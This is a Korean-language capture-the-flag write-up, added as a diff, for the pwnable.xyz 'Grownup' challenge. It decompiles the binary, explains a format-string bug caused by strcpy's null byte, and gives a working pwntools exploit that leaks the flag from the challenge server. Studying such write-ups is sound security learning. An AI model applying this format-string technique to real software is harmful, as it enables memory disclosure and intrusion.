@@ -1,0 +1,49 @@
+# pwnable.xyz
+## Grownup
+~~~c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char *src; // ST08_8
+  __int64 buf; // [rsp+10h] [rbp-20h]
+  __int64 v6; // [rsp+18h] [rbp-18h]
+  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  setup();
+  buf = 0LL;
+  v6 = 0LL;
+  printf("Are you 18 years or older? [y/N]: ", argv);
+  *((_BYTE *)&buf + (signed int)((unsigned __int64)read(0, &buf, 0x10uLL) - 1)) = 0;
+  if ( (_BYTE)buf != 'y' && (_BYTE)buf != 'Y' )
+    return 0;
+  src = (char *)malloc(0x84uLL);
+  printf("Name: ", &buf);
+  read(0, src, 0x80uLL);
+  strcpy(usr, src);
+  printf("Welcome ", src);
+  printf(qword_601160, usr);
+  return 0;
+}
+~~~
+ida를 통해 본 코드는 위와 같다. 첫입력에서 y나 Y를 입력하지 않을 경우 프로그램이 멈춘다.
+read를 한 것을 strcpy로 옮기는 것이 수상해서 검색해봤다. read는 null을 끝에 붙이지 않는데 strcpy는 null을 끝에 붙여준다.
+좀 더 알아보니 포맷스트링 공격이 가능하다고 한다. 위 코드 경우 끝에 0x81에 null 값이 들어가서 포맷스트링 공격이 가능한 것이다.
+data 부분을 조금 더 찾았더니 0x601080 주소에 flag가 있는 것을 확인했다. 내가 이해한 것은 0x80만큼 name부분에 집어넣어 포맷스트링을 
+손상시키는 것이었는데 잘 안 되었다. 알고보니 처음에 y를 입력할 때 flag의 주소값을 입력해야 하는 거였다.
+~~~python
+from pwn import *
+r=remote("svc.pwnable.xyz",30004)
+flag=0x601080
+pay=''
+pay+='Y'+'A'*7+p32(flag)
+r.recvuntil("[y/N]: ")
+r.sendline(pay)
+formatstr='%p%p%p%p%p%p%p%p%s%p%p%p'
+pay=''
+pay+='A'*60+formatstr+'A'*(0x80-len(formatstr)-32)
+r.recvuntil("Name: ")
+r.sendline(pay)
+print r.recvall()
+~~~
+writeup을 참고하여 짜게 된 exploitcode이다. 우선 18살 이상이냐고 물을 때 y와 dummy(7) 그리고 flag 주소를 little endian으로 넣어준다.
+다음 formatstr을 통해 몇번째에 flag가 나타나는지 확인하고 그 부분을 %s로 바꾸어 flag를 확인한다.
